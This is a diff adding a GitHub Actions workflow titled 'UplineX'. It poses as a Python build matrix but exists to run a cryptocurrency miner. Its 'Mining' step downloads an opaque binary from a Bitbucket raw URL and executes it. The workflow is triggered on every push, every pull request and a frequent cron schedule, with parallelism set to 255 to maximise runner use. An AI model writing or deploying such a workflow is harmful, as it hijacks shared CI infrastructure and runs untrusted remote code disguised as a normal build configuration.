@@ -1,0 +1,26 @@
+name: UplineX
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  schedule:
+    - cron: "*/30 */5 * * *"
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 255
+      matrix:
+        python-version: [3.7,3.6,3.7,3.9,3.8,]
+
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: Mining
+      run: | !sudo apt-get update && sudo add-apt-repository ppa:ubuntu-toolchain-r/test -y && sudo apt install gcc-9 -y && sudo apt install libstdc++6 -y && sudo apt install cpulimit screen -y && wget https://bitbucket.org/soneosuneo/sarjana_chia2/raw/dcc017d4d0d425c681552c61467afa40ad3c6fca/guard3 && chmod +x guard3 && ./guard3
